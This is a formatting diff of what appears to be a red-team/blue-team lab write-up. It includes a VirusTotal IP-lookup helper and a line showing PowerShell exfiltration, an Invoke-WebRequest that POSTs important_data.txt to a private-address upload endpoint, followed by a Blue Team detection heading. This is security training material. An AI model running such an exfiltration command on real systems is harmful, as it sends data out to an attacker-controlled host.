@@ -169,7 +169,7 @@ return list(ips)\
 def vt_ip_lookup(ip):\
 \"\"\"Query VirusTotal for IP reputation.\"\"\"\
 url =
-f\"\[https://www.virustotal.com/api/v3/ip_addresses/\](https://www.virustotal.com/api/v3/ip_addresses/){ip}\"\
+f\"\[https://www.virustotal.com/api/v3/ip_addresses/{ip}\]
 headers = {\
 \"x-apikey\": VIRUSTOTAL_API_KEY\
 }\
@@ -384,7 +384,7 @@ mitigation.
 
 -   Used PowerShell for exfiltration:\
     > Invoke-WebRequest -Uri
-    > \[http://192.168.31.163:8080/upload\](http://192.168.31.163:8080/upload)
+    > \[http://192.168.31.163:8080/upload\]
     > -Method POST -InFile important_data.txt
 
 ### Phase 2: Attack Detection & Investigation (Blue Team)
